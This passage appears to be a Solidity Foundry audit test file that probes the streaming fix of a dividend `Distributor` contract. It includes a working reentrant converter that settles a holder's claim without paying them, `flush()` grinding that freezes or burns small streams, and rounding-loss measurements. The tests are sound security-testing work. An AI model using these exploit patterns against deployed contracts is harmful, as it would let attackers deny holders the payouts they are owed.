// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Distributor, IRewardConverter} from "../../../src/Distributor.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";

// ===============================================================================================
// ROUND 2 - attacking the STREAMING fix, not the thing it replaced.
//
// Round 1 found a CRITICAL (E-03, instant capture) and several HIGHs. They were fixed by moving
// `distribute` from "credit the accumulator now" to "_arm a linear 24h stream". This file attacks
// the new machinery: `_arm` / `_checkpoint` / `_perShareNow` / `flush` / the converter delta check.
//
// Everything already fixed AND already regression-tested in `test/Streaming.t.sol` or
// `test/audit/DividendAudit.t.sol` is deliberately not re-reported here.
// ===============================================================================================

/// @dev A converter that takes NOTHING but makes the distributor's payout balance fall anyway, by
///      re-entering the permissionless `processBatch` and letting a DIFFERENT holder be paid out
///      of the same balance. Round 1's fix judges conversion success by the balance DELTA, so the
///      delta caused by somebody else's payout is misread as "this converter spent the allowance".
contract ReentrantDrainConverter is IRewardConverter {
    Distributor public d;
    bool public armed = true;
    uint256 public hits;

    function arm(Distributor _d) external {
        d = _d;
        armed = true;
    }

    function convert(address, address, uint256, address) external returns (uint256) {
        hits++;
        if (armed) {
            armed = false;
            // Pays OTHER queued holders. Every wei that leaves here is attributed to us by the
            // caller's `heldBefore - balanceAfter` measurement.
            d.processBatch(8);
        }
        // Takes nothing, produces nothing. The documented "could not route" signal.
        return 0;
    }
}

/// @dev Same converter with the re-entrancy switched off. Negative control for the test above:
///      it must fall through to the pair-currency transfer and actually pay the holder.
contract InertConverter is IRewardConverter {
    uint256 public hits;

    function convert(address, address, uint256, address) external returns (uint256) {
        hits++;
        return 0;
    }
}

contract DividendAudit2Test is Test {
    uint256 internal constant MAGNITUDE = 2 ** 128;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    address internal carol = address(0xCA401);
    address internal griefer = address(0x6417);

    MockERC20 internal reward;

    function setUp() public {
        reward = new MockERC20("Reward", "RWD", 18);
        vm.warp(1_000_000);
    }

    // -------------------------------------------------------------------------------------------
    // Harness
    // -------------------------------------------------------------------------------------------

    /// @dev **Never write `vm.warp(block.timestamp + dt)` in a loop.** solc treats `TIMESTAMP` as
    ///      loop-invariant inside a single call frame and hoists it out, so every iteration warps
    ///      to the SAME stale value and the loop silently does nothing. That produced a completely
    ///      fictitious "value creation" reading while writing this file. `vm.getBlockTimestamp()`
    ///      is an external cheatcode call and cannot be hoisted.
    function _tick(uint256 dt) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _mk(uint8 dec, uint256 minPush, uint256 minQueue, uint256 minShares, address rewardTok, address conv)
        internal
        returns (Distributor d)
    {
        MockERC20 p = new MockERC20("Pair", "PAIR", dec);
        d = new Distributor(
            address(this), address(p), address(this), address(0), address(0),
            minPush, minQueue, minShares, rewardTok, conv
        );
    }

    function _mk() internal returns (Distributor d) {
        d = _mk(18, 1, 1, 1, address(0), address(0));
    }

    function _pair(Distributor d) internal view returns (MockERC20) {
        return MockERC20(d.payoutToken());
    }

    function _give(Distributor d, uint256 amount) internal {
        _pair(d).mint(address(d), amount);
        d.distribute(amount);
    }

    /// @notice Value that is still scheduled to vest AFTER this instant.
    /// @dev Deliberately excludes the `lastCheckpoint -> now` slice, because `withdrawableOf`
    ///      already contains that slice through `_perShareNow()`. Adding both double-counts.
    function _unvestedAhead(Distributor d) internal view returns (uint256) {
        uint64 fin = d.streamFinish();
        uint256 ts = _now();
        if (fin <= ts) return 0;
        return ((fin - ts) * d.streamRate()) / MAGNITUDE;
    }

    /// @notice Everything the contract still owes somebody, on any timescale.
    function _owed(Distributor d, address[] memory who) internal view returns (uint256 t) {
        for (uint256 i = 0; i < who.length; i++) {
            t += d.withdrawableOf(who[i]);
        }
        t += d.pendingPayouts();
        t += _unvestedAhead(d);
    }

    function _three() internal view returns (address[] memory a) {
        a = new address[](3);
        a[0] = alice;
        a[1] = bob;
        a[2] = carol;
    }

    // ===========================================================================================
    // R2-01  `flush()` is permissionless and re-arms with 1 wei of its own dust, which lets a
    //        griefer pin `lastCheckpoint` to `block.timestamp` forever. On a stream small enough
    //        that one block's vest rounds to zero, NOTHING EVER VESTS.
    // ===========================================================================================

    /// @dev `_arm` (Distributor.sol:303-304) always carries 1 wei of truncation dust into
    ///      `pendingPayouts`, so `flush()` (Distributor.sol:326) is infinitely re-callable with no
    ///      new money. Each call ends in `_arm`, whose last line
    ///      (`lastCheckpoint = uint64(nowTs)`, Distributor.sol:308) resets the clock
    ///      UNCONDITIONALLY - including when `_checkpoint`'s `vested == 0` guard
    ///      (Distributor.sol:244) had just declined to advance it precisely so the fraction could
    ///      accumulate.
    ///
    ///      Result: the accumulator's elapsed term is permanently clamped to one block, and if one
    ///      block's worth rounds to zero it stays zero forever.
    function test_R2_01_flushGrindFreezesVestingOnASmallStream() public {
        // Both distributors are armed identically and share one wall clock. Only `d` is ground.
        Distributor d = _mk();
        Distributor c = _mk();
        d.setBalance(alice, 1_000e18);
        c.setBalance(alice, 1_000e18);
        _give(d, 3600); // 3600 base units over 86_400s => 1 wei per 24s; a 12s block vests zero
        _give(c, 3600);

        for (uint256 i = 0; i < 3000; i++) {
            _tick(12);
            vm.prank(griefer);
            d.flush();
        }
        // 36_000s, ~41% of the window.

        assertEq(d.totalDistributed(), 0, "griefed stream vested something");
        assertEq(d.withdrawableOf(alice), 0, "griefed holder accrued something");

        // Negative control on the same clock: without the grind the same stream really does vest.
        assertGt(c.withdrawableOf(alice), 1_000, "control did not vest, so the test proves nothing");

        // ...and the griefer also pushed the finish line out while doing it.
        assertGt(d.streamFinish(), c.streamFinish(), "the finish line was not extended");
    }

    /// The value is DELAYED, not destroyed: stop grinding and it still all arrives.
    function test_R2_01b_theFrozenStreamStillPaysOutOnceTheGrinderStops() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 3600);

        for (uint256 i = 0; i < 500; i++) {
            _tick(12);
            vm.prank(griefer);
            d.flush();
        }
        _tick(400 * uint256(d.STREAM_WINDOW()));
        d.flush();

        assertApproxEqAbs(d.withdrawableOf(alice) + d.pendingPayouts(), 3600, 2, "value was destroyed");
    }

    /// @dev The stall threshold, stated precisely. It bites only while
    ///      `blockTime * total / STREAM_WINDOW < 1`, i.e. `total < 7200` base units at a 12s block.
    ///      On an 18-decimal pair that is 7200 wei. On a 6-decimal pair (USDC/USDG) it is
    ///      0.0072 USD. This is what caps the severity.
    function test_R2_01c_theStallThresholdIsAboutSevenThousandBaseUnits() public {
        uint256[3] memory amts = [uint256(3_600), 7_100, 8_000];
        bool[3] memory stalled;
        for (uint256 k = 0; k < 3; k++) {
            Distributor d = _mk();
            d.setBalance(alice, 1_000e18);
            _give(d, amts[k]);
            for (uint256 i = 0; i < 200; i++) {
                _tick(12);
                vm.prank(griefer);
                d.flush();
            }
            stalled[k] = d.totalDistributed() == 0;
        }
        assertTrue(stalled[0], "3600 should stall");
        assertTrue(stalled[1], "7100 should stall");
        assertFalse(stalled[2], "8000 should NOT stall - the bound is real, not universal");
    }

    /// A large stream cannot be stalled or meaningfully delayed by the same grind.
    function test_R2_01d_sound_aLargeStreamShrugsOffTheSameGrind() public {
        Distributor d = _mk();
        Distributor c = _mk();
        d.setBalance(alice, 1_000e18);
        c.setBalance(alice, 1_000e18);
        _give(d, 1e18);
        _give(c, 1e18);

        for (uint256 i = 0; i < 3000; i++) {
            _tick(12);
            vm.prank(griefer);
            d.flush();
        }

        // Within 1e-12 of the ungriefed schedule, on the same clock.
        assertApproxEqRel(d.withdrawableOf(alice), c.withdrawableOf(alice), 1e6, "large stream was delayed");
        assertEq(d.streamFinish(), c.streamFinish(), "large stream's finish line moved");
    }

    // ===========================================================================================
    // R2-02  Every `_arm` call permanently strands a wei or two. Grinding `flush()` turns that
    //        into an unbounded (but gas-priced) burn of other people's dividends.
    // ===========================================================================================

    /// @dev Two independent truncations, neither of them carried:
    ///        1. `_checkpoint` (Distributor.sol:238) floors `elapsed * rate / MAGNITUDE` and then
    ///           advances `lastCheckpoint` to `upTo` in full, discarding the sub-wei residue.
    ///        2. `_arm` (Distributor.sol:293) recomputes `remaining` as
    ///           `floor(remainingTime * rate / MAGNITUDE)`, which is strictly below the true
    ///           unvested balance, and the difference is not added to `pendingPayouts`.
    ///      The `dust` carry on line 303 covers only the third truncation (`rate * window`), not
    ///      these two.
    function test_R2_02_eachFlushBurnsAboutOneWeiOfOtherPeoplesDividends() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 1e18);

        uint256 calls = 3000;
        for (uint256 i = 0; i < calls; i++) {
            _tick(12);
            vm.prank(griefer);
            d.flush();
        }
        _tick(400 * uint256(d.STREAM_WINDOW()));
        d.flush();
        uint256 griefed = d.withdrawableOf(alice) + d.pendingPayouts();

        // Control: identical timeline, nobody grinding.
        Distributor c = _mk();
        c.setBalance(alice, 1_000e18);
        _give(c, 1e18);
        _tick(calls * 12 + 400 * uint256(c.STREAM_WINDOW()));
        uint256 clean = c.withdrawableOf(alice) + c.pendingPayouts();

        assertLt(griefed, clean, "no value was burned, so this finding is wrong");
        uint256 burned = clean - griefed;
        console2.log("burned wei", burned);
        console2.log("per flush ", burned / calls);

        // Strictly bounded by one wei per `_arm`, which is what makes this dust and not a hole.
        assertLe(burned, calls, "burn exceeded one wei per arm - the bound is wrong");
        // The griefer gains nothing: the wei is stranded on the contract, not paid to anyone.
        assertEq(_pair(d).balanceOf(griefer), 0, "the griefer was paid");
    }

    // ===========================================================================================
    // R2-03  Value conservation. Stateless fuzz over an adversarial call ordering.
    // ===========================================================================================

    /// Nothing the caller can sequence may let the contract owe more than it holds.
    function testFuzz_R2_03_neverOwesMoreThanItHolds(
        uint96 a1,
        uint96 a2,
        uint96 shareA,
        uint96 shareB,
        uint32 t1,
        uint32 t2,
        uint8 flushes
    ) public {
        Distributor d = _mk();
        shareA = uint96(bound(shareA, 1, type(uint96).max));
        shareB = uint96(bound(shareB, 1, type(uint96).max));
        a1 = uint96(bound(a1, 1, type(uint96).max));
        a2 = uint96(bound(a2, 0, type(uint96).max));

        d.setBalance(alice, shareA);
        d.setBalance(bob, shareB);
        _give(d, a1);

        _tick(bound(t1, 0, 3 * uint256(d.STREAM_WINDOW())));
        for (uint256 i = 0; i < bound(flushes, 0, 20); i++) {
            _tick(1);
            d.flush();
        }
        if (a2 != 0) _give(d, a2);
        _tick(bound(t2, 0, 3 * uint256(d.STREAM_WINDOW())));

        assertLe(_owed(d, _three()), _pair(d).balanceOf(address(d)), "owes more than it holds");
    }

    /// The stream may never schedule more than was actually handed over.
    function testFuzz_R2_03b_neverSchedulesMoreThanWasGiven(uint96 a1, uint96 a2, uint32 gap, uint8 flushes)
        public
    {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        d.setBalance(bob, 7e18);

        uint256 given;
        a1 = uint96(bound(a1, 1, type(uint96).max));
        a2 = uint96(bound(a2, 1, type(uint96).max));

        _give(d, a1);
        given += a1;
        _tick(bound(gap, 1, uint256(d.STREAM_WINDOW())));
        for (uint256 i = 0; i < bound(flushes, 0, 20); i++) {
            _tick(1);
            d.flush();
        }
        _give(d, a2);
        given += a2;

        assertLe(_owed(d, _three()), given, "scheduled more than was given");

        // And after everything has run to completion it is still true, with the leak on our side.
        _tick(10 * uint256(d.STREAM_WINDOW()));
        d.flush();
        _tick(10 * uint256(d.STREAM_WINDOW()));
        assertLe(_owed(d, _three()), given, "over-vested by the end");
    }

    // ===========================================================================================
    // R2-04  Is instant capture really dead?
    // ===========================================================================================

    /// Same-block capture must be EXACTLY zero across the whole parameter space, including the
    /// `flush()`-immediately-after-`_arm` path that did not exist in round 1.
    function testFuzz_R2_04_sound_zeroBlockCaptureIsExactlyZero(
        uint96 amount,
        uint96 attackerShares,
        uint96 honestShares,
        uint32 preElapsed
    ) public {
        Distributor d = _mk();
        // Bounded away from the already-reported `accumulativeOf` overflow cliff (round 1,
        // D-06/D-07: `_magnifiedPayoutPerShare * shareOf` leaves int256 once the pot is huge
        // against a dust denominator). That is a known finding; this test is about capture.
        amount = uint96(bound(amount, 1, 1e24));
        attackerShares = uint96(bound(attackerShares, 1e18, 1e27));
        honestShares = uint96(bound(honestShares, 1e18, 1e27));

        d.setBalance(alice, honestShares);
        _give(d, amount);
        _tick(bound(preElapsed, 0, 2 * uint256(d.STREAM_WINDOW())));

        // Everything below happens inside ONE block.
        d.setBalance(griefer, attackerShares); // buy
        _give(d, amount); // sweep
        d.flush(); // and try to shake the carry loose too
        d.flush();
        uint256 captured = d.withdrawableOf(griefer);
        d.setBalance(griefer, 0); // sell

        assertEq(captured, 0, "a zero-block position was credited");
        assertEq(d.withdrawableOf(griefer), 0, "a zero-block position kept a claim");
    }

    /// @dev The residual I most expected to survive: `lastCheckpoint` lags real time whenever the
    ///      token is quiet, so a single `_checkpoint` can fold in many hours at once. If that fold
    ///      happened AFTER the share write, a whale could buy into a quiet token and take the
    ///      backlog in one block. It does not: `setBalance` (Distributor.sol:372) checkpoints
    ///      first, so the backlog lands on the OLD register.
    function test_R2_04b_sound_aWhaleCannotBuyIntoAQuietTokensBacklog() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 100e18);

        // 20 hours of total silence: nothing calls _checkpoint, so lastCheckpoint is 20h stale.
        _tick(20 hours);
        assertEq(d.lastCheckpoint(), _now() - 20 hours, "precondition: the clock really is stale");
        assertGt(d.withdrawableOf(alice), 80e18, "precondition: a real backlog exists");

        // The whale arrives and takes 99.9% of the register, then leaves in the same block.
        d.setBalance(griefer, 1_000_000e18);
        assertEq(d.withdrawableOf(griefer), 0, "the whale took the backlog");

        d.setBalance(griefer, 0);
        assertGt(d.withdrawableOf(alice), 80e18, "the honest holder's backlog was diluted");
    }

    /// The same, but the whale arrives via `setExcluded` being lifted rather than via a transfer.
    function test_R2_04c_sound_unExcludingMidStreamGrantsNoBacklog() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 100e18);
        _tick(20 hours);

        d.setExcluded(griefer, true);
        d.setBalance(griefer, 500e18); // excluded => no shares
        assertEq(d.shareOf(griefer), 0, "an excluded account got shares");

        d.setExcluded(griefer, false);
        d.setBalance(griefer, 500e18);
        assertEq(d.withdrawableOf(griefer), 0, "un-excluding paid a backlog");
    }

    // ===========================================================================================
    // R2-05  `_perShareNow()` and `_checkpoint()` must round identically, or the view lies.
    // ===========================================================================================

    /// What `withdrawableOf` promises must be EXACTLY what `withdraw()` pays in the same block.
    function testFuzz_R2_05_sound_theViewNeverPromisesMoreThanTheWithdrawPays(
        uint96 amount,
        uint96 shareA,
        uint96 shareB,
        uint32 t1,
        uint8 dec
    ) public {
        Distributor d = _mk(uint8(bound(dec, 2, 18)), 1, 1, 1, address(0), address(0));
        amount = uint96(bound(amount, 1, type(uint96).max));
        shareA = uint96(bound(shareA, 1, type(uint96).max));
        shareB = uint96(bound(shareB, 1, type(uint96).max));

        d.setBalance(alice, shareA);
        d.setBalance(bob, shareB);
        _give(d, amount);
        _tick(bound(t1, 1, 3 * uint256(d.STREAM_WINDOW())));

        uint256 promised = d.withdrawableOf(alice);
        if (promised == 0) return;

        uint256 before = _pair(d).balanceOf(alice);
        vm.prank(alice);
        uint256 paid = d.withdraw();

        assertEq(paid, promised, "withdraw paid a different number than the view promised");
        assertEq(_pair(d).balanceOf(alice) - before, promised, "the transfer did not match the view");
        assertEq(d.withdrawableOf(alice), 0, "a residue survived a full withdraw");
    }

    /// `processBatch` reads the same view inside its loop; it must agree too.
    function testFuzz_R2_05b_sound_pushPaysExactlyWhatTheViewPromised(uint96 amount, uint32 t1) public {
        Distributor d = _mk();
        amount = uint96(bound(amount, 1e6, type(uint96).max));
        d.setBalance(alice, 1_000e18);
        d.setBalance(bob, 3_000e18);
        _give(d, amount);
        _tick(bound(t1, 1, 3 * uint256(d.STREAM_WINDOW())));

        uint256 pa = d.withdrawableOf(alice);
        uint256 pb = d.withdrawableOf(bob);
        (, uint256 sentTotal) = d.processBatch(10);

        assertEq(sentTotal, pa + pb, "push moved a different total than the views promised");
        assertEq(_pair(d).balanceOf(alice), pa, "alice was paid a different number");
        assertEq(_pair(d).balanceOf(bob), pb, "bob was paid a different number");
    }

    // ===========================================================================================
    // R2-06  The weighted-average window must never accelerate a stream.
    // ===========================================================================================

    /// @dev The load-bearing safety property of `_arm`. `window` is a convex combination of
    ///      `remainingTime` and `STREAM_WINDOW`, so `streamFinish` can never be pushed past
    ///      `now + STREAM_WINDOW` and the vesting rate is sub-additive. If either failed, a
    ///      crafted top-up could collapse the window and hand a same-block position the pot -
    ///      which is the CRITICAL coming back through the fix.
    function testFuzz_R2_06_sound_finishNeverExceedsOneWindowAhead(
        uint96 a1,
        uint96 a2,
        uint96 a3,
        uint32 g1,
        uint32 g2
    ) public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        uint64 W = d.STREAM_WINDOW();

        _give(d, bound(a1, 1, type(uint96).max));
        assertLe(d.streamFinish(), _now() + W, "finish ran past one window after the first arm");

        _tick(bound(g1, 0, uint256(W)));
        d.flush();
        assertLe(d.streamFinish(), _now() + W, "flush pushed the finish past one window");

        _give(d, bound(a2, 1, type(uint96).max));
        assertLe(d.streamFinish(), _now() + W, "a top-up pushed the finish past one window");

        _tick(bound(g2, 0, uint256(W)));
        _give(d, bound(a3, 1, type(uint96).max));
        assertLe(d.streamFinish(), _now() + W, "a late top-up pushed the finish past one window");
    }

    /// A top-up can never make the stream pay out FASTER than the two schedules would separately.
    function testFuzz_R2_06b_sound_theRateIsSubAdditive(uint96 a1, uint96 a2, uint32 gap) public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        uint256 W = uint256(d.STREAM_WINDOW());

        a1 = uint96(bound(a1, 1e9, type(uint96).max));
        a2 = uint96(bound(a2, 1e9, type(uint96).max));

        _give(d, a1);
        uint256 rateBefore = d.streamRate();

        _tick(bound(gap, 1, W - 1));
        _give(d, a2);
        uint256 rateAfter = d.streamRate();

        // Ceiling: the old rate plus what the new money would earn on its own full window.
        //
        // In exact arithmetic this holds with no slack at all - the difference works out to
        // `a*r*(W - T)^2 / W >= 0`. The slack is entirely `window` truncation: `_arm` floors
        // `window` (Distributor.sol:297) and then divides by it (line 300), so the stored rate is
        // inflated by at most one part in `window`, and `window >= 1`. One part in 8640 is a
        // 10x margin on the 1/86400 that a full-window stream actually shows.
        uint256 ceiling = rateBefore + (uint256(a2) * MAGNITUDE) / W + MAGNITUDE;
        assertLe(
            rateAfter,
            ceiling + ceiling / 8640,
            "the top-up accelerated the stream beyond the sum of its parts"
        );
    }

    // ===========================================================================================
    // R2-07  The converter delta check. Round 1's D-01 fix is bypassable in the OTHER direction:
    //        the converter can be credited with a balance drop it did not cause, which settles a
    //        holder's whole claim while paying them nothing.
    // ===========================================================================================

    /// @dev `Distributor.sol:529` measures `taken = heldBefore - balanceOf(this)` across the
    ///      `convert` call and treats any non-zero delta as proof the converter spent the
    ///      allowance (`taken != 0` -> `return true`, line 530-536). The delta is a property of
    ///      the CONTRACT'S BALANCE, not of the allowance, and `processBatch` is permissionless and
    ///      re-entrant-reachable from inside `convert`. A converter that pulls nothing but pays
    ///      somebody else out of the same balance therefore reads as a success.
    ///
    ///      `withdraw()` has already incremented `_withdrawn[alice]` (line 450) before calling
    ///      `_trySend`, so a `true` return finalises the claim. Alice is debited in full and
    ///      receives zero, in either currency.
    ///
    ///      Round 1's `test_sound_aReentrantConverterCannotDoublePay` only asserts nobody is paid
    ///      MORE than they are owed. It cannot see this, because this is an under-payment.
    function test_R2_07_aReentrantConverterSettlesAClaimWithoutPayingIt() public {
        ReentrantDrainConverter conv = new ReentrantDrainConverter();
        Distributor d = _mk(18, 1, 1, 1, address(reward), address(conv));
        conv.arm(d);

        d.setBalance(alice, 1_000e18);
        d.setBalance(bob, 1_000e18);
        _give(d, 200e18);
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 owedAlice = d.withdrawableOf(alice);
        assertGt(owedAlice, 0, "precondition: alice must actually be owed something");

        vm.prank(alice);
        uint256 claimed = d.withdraw();

        assertGt(conv.hits(), 1, "the re-entrancy never fired, so this proves nothing");
        assertEq(claimed, owedAlice, "withdraw reported a partial claim");

        // The damage.
        assertEq(_pair(d).balanceOf(alice), 0, "alice was paid the pair currency after all");
        assertEq(reward.balanceOf(alice), 0, "alice was paid the reward currency after all");
        assertEq(d.withdrawnOf(alice), owedAlice, "alice's claim was not consumed");
        assertEq(d.withdrawableOf(alice), 0, "alice can still re-claim, so nothing was lost");

        console2.log("alice was debited      ", owedAlice);
        console2.log("alice actually received", _pair(d).balanceOf(alice) + reward.balanceOf(alice));
    }

    /// Negative control: the SAME converter, same amounts, re-entrancy disabled. `taken` is then
    /// honestly zero, the code falls through, and alice is paid in full.
    function test_R2_07b_control_withoutTheReentrancyTheHolderIsPaid() public {
        InertConverter conv = new InertConverter();
        Distributor d = _mk(18, 1, 1, 1, address(reward), address(conv));

        d.setBalance(alice, 1_000e18);
        d.setBalance(bob, 1_000e18);
        _give(d, 200e18);
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 owedAlice = d.withdrawableOf(alice);
        vm.prank(alice);
        d.withdraw();

        assertGt(conv.hits(), 0, "the converter was never called");
        assertEq(_pair(d).balanceOf(alice), owedAlice, "control failed: the holder was not paid");
    }

    /// The push path has the same hole. `processBatch` emits `PayoutSent(alice, amount)`, counts
    /// her in `sentCount`/`sentTotal`, and consumes her claim - while every wei that moved went to
    /// somebody else.
    function test_R2_07c_thePushPathAlsoSettlesAClaimItNeverPaid() public {
        ReentrantDrainConverter conv = new ReentrantDrainConverter();
        Distributor d = _mk(18, 1, 1, 1, address(reward), address(conv));
        conv.arm(d);

        d.setBalance(alice, 1_000e18);
        d.setBalance(bob, 1_000e18);
        d.setBalance(carol, 1_000e18);
        _give(d, 300e18);
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 owedAlice = d.withdrawableOf(alice);
        assertGt(owedAlice, 0, "precondition: alice must be owed something");

        uint256 heldBefore = _pair(d).balanceOf(address(d));
        (uint256 sentCount, uint256 sentTotal) = d.processBatch(3);
        uint256 reallyMoved = heldBefore - _pair(d).balanceOf(address(d));

        assertGt(conv.hits(), 1, "the re-entrancy never fired");
        assertGt(sentCount, 0, "the batch reported paying nobody");

        // Alice's claim is gone and alice holds nothing, in either currency.
        assertEq(d.withdrawnOf(alice), owedAlice, "alice's claim was not consumed");
        assertEq(d.withdrawableOf(alice), 0, "alice can still re-claim");
        assertEq(_pair(d).balanceOf(alice) + reward.balanceOf(alice), 0, "alice was paid after all");

        // ...and the batch's own report does not match what left the contract.
        assertTrue(sentTotal != reallyMoved, "sentTotal happened to match, weaken the claim");
        console2.log("reported sent", sentTotal);
        console2.log("really moved ", reallyMoved);
        console2.log("alice held   ", _pair(d).balanceOf(alice) + reward.balanceOf(alice));
    }

    // ===========================================================================================
    // R2-08  Checked and found sound.
    // ===========================================================================================

    /// Without a griefer to reset it, the `vested == 0` branch self-heals: `lastCheckpoint` stays
    /// put and the fraction accumulates until it is worth a whole base unit.
    function test_R2_08_sound_theSubUnitBranchSelfHealsWhenNobodyArms() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 3600);

        // setBalance runs _checkpoint on every block, but does NOT re-arm.
        for (uint256 i = 0; i < 500; i++) {
            _tick(12);
            d.setBalance(bob, i + 1);
        }
        assertGt(d.totalDistributed(), 100, "the clock never advanced without a griefer");
        assertGt(d.withdrawableOf(alice), 100, "the holder never accrued without a griefer");
    }

    // ===========================================================================================
    // R2-03  On a stream small enough that one block's vest rounds to zero, ORDINARY TRADING
    //        destroys a large fraction of it. No attacker required.
    // ===========================================================================================

    /// @dev `_checkpoint` advances `lastCheckpoint` to `upTo` in FULL (Distributor.sol:245) but
    ///      credits only `floor(elapsed * rate / MAGNITUDE)` (line 238). The `vested == 0` guard
    ///      on line 244 stops the residue being lost when it rounds all the way to zero, but does
    ///      nothing about the residue on a vest that rounds to 1, or 2, or 5.
    ///
    ///      `LaunchToken._update` calls `setBalance` twice per transfer, so on a busy token
    ///      `_checkpoint` runs on essentially every block, which is the worst case for that floor.
    function test_R2_03_frequentCheckpointsDestroyPartOfASmallStream() public {
        Distributor d = _mk();
        Distributor c = _mk();
        d.setBalance(alice, 1_000e18);
        c.setBalance(alice, 1_000e18);
        _give(d, 3600);
        _give(c, 3600);

        // `d` is checkpointed every block by ordinary transfer traffic; `c` is left alone.
        uint256 blocks = uint256(d.STREAM_WINDOW()) / 12;
        for (uint256 i = 0; i < blocks; i++) {
            _tick(12);
            d.setBalance(bob, i + 1);
        }
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 busy = d.withdrawableOf(alice) + d.withdrawableOf(bob) + d.pendingPayouts();
        uint256 quiet = c.withdrawableOf(alice) + c.pendingPayouts();

        console2.log("quiet token pays", quiet);
        console2.log("busy  token pays", busy);
        assertEq(quiet, 3599, "control: an untouched stream pays out in full");
        assertLt(busy, quiet, "checkpoint frequency cost nothing, so this finding is wrong");
        // Measured: 2400 of 3599 survives. A third of the stream is destroyed.
        assertLe(busy * 10, quiet * 7, "the loss was smaller than reported");
    }

    /// @notice **The magnification fix is only half applied.** `streamRate` was made
    ///         pre-magnified (Distributor.sol:94-102) exactly so a low-decimal pair would not
    ///         truncate to nothing. But `_checkpoint` then divides the magnitude straight back out
    ///         on EVERY call (Distributor.sol:238) and throws the remainder away, so the identical
    ///         low-decimal truncation returns one checkpoint at a time.
    ///
    ///         Measured on a 6-decimal pair (USDC/USDG), checkpointed once per 12s block, which is
    ///         what `LaunchToken._update -> setBalance` produces on any token that trades.
    function test_R2_03c_lowDecimalPairsLoseARealFractionOfEverySmallStream() public {
        uint256[4] memory fees = [uint256(10_000), 100_000, 1_000_000, 10_000_000]; // 0.01 .. 10 USDG
        uint256[4] memory lost;

        for (uint256 k = 0; k < 4; k++) {
            Distributor d = _mk(6, 1, 1, 1, address(0), address(0));
            d.setBalance(alice, 1_000e18);
            _give(d, fees[k]);

            uint256 blocks = uint256(d.STREAM_WINDOW()) / 12;
            for (uint256 i = 0; i < blocks; i++) {
                _tick(12);
                d.setBalance(bob, i + 1);
            }
            _tick(2 * uint256(d.STREAM_WINDOW()));

            uint256 paid = d.withdrawableOf(alice) + d.withdrawableOf(bob) + d.pendingPayouts();
            lost[k] = fees[k] - paid;
            console2.log("fee (6dp base units)", fees[k]);
            console2.log("  never vested      ", lost[k]);
            console2.log("  loss in bps       ", (lost[k] * 10_000) / fees[k]);
        }

        // A 0.01 USDG stream loses double-digit percent; a 10 USDG stream loses ~nothing.
        assertGt((lost[0] * 10_000) / fees[0], 500, "the small-fee loss is smaller than reported");
        assertLt((lost[3] * 10_000) / fees[3], 10, "the large-fee case is not the control it claims");
    }

    /// The same traffic on a normal-sized stream costs essentially nothing, which is the bound.
    function test_R2_03b_sound_frequentCheckpointsAreFreeOnANormalStream() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 1e18);

        uint256 blocks = uint256(d.STREAM_WINDOW()) / 12;
        for (uint256 i = 0; i < blocks; i++) {
            _tick(12);
            d.setBalance(bob, i + 1);
        }
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 paid = d.withdrawableOf(alice) + d.withdrawableOf(bob) + d.pendingPayouts();
        assertApproxEqRel(paid, 1e18, 1e9, "a normal stream lost measurable value to checkpointing");
    }

    /// A `flush()` storm inside ONE block changes nothing at all: `_checkpoint` sees
    /// `upTo <= lastCheckpoint` and `_arm` is a fixed point on its own dust.
    function test_R2_08b_sound_sameBlockFlushSpamIsANoOp() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 100e18);
        _tick(uint256(d.STREAM_WINDOW()) / 2);
        d.flush();

        uint64 fin = d.streamFinish();
        uint256 rate = d.streamRate();
        uint256 dist = d.totalDistributed();
        uint256 owed = d.withdrawableOf(alice);

        for (uint256 i = 0; i < 200; i++) {
            d.flush();
        }
        assertEq(d.streamFinish(), fin, "same-block spam moved the finish line");
        assertEq(d.streamRate(), rate, "same-block spam moved the rate");
        assertEq(d.totalDistributed(), dist, "same-block spam vested something");
        assertEq(d.withdrawableOf(alice), owed, "same-block spam changed a claim");
    }

    /// `streamRate` can never be driven to zero while value is still scheduled: it is
    /// pre-magnified, and `window <= STREAM_WINDOW`, so the floor is `MAGNITUDE / 86400 > 0`.
    function testFuzz_R2_08c_sound_streamRateIsNeverZeroWhileValueIsScheduled(uint96 amount, uint8 flushes)
        public
    {
        Distributor d = _mk(6, 1, 1, 1, address(0), address(0)); // 6-decimal pair, the hard case
        d.setBalance(alice, 1_000e18);
        _give(d, bound(amount, 1, type(uint96).max));

        for (uint256 i = 0; i < bound(flushes, 1, 30); i++) {
            _tick(1);
            d.flush();
            assertGt(d.streamRate(), 0, "the rate collapsed to zero with value still scheduled");
        }
    }

    /// A huge `totalShares` swing mid-stream neither creates nor destroys entitlement, and the
    /// holder present across the whole window still ends up with the pot.
    function test_R2_08d_sound_aMassiveMidStreamShareSwingIsNeutral() public {
        Distributor d = _mk();
        d.setBalance(alice, 1_000e18);
        _give(d, 100e18);

        _tick(uint256(d.STREAM_WINDOW()) / 2);
        d.setBalance(bob, 1_000_000_000e18); // 1e6x the register, mid-stream
        _tick(uint256(d.STREAM_WINDOW()) / 2);
        d.setBalance(bob, 0);
        _tick(2 * uint256(d.STREAM_WINDOW()));

        uint256 total = d.withdrawableOf(alice) + d.withdrawableOf(bob) + d.pendingPayouts();
        assertApproxEqRel(total, 100e18, 1e12, "the swing created or destroyed value");
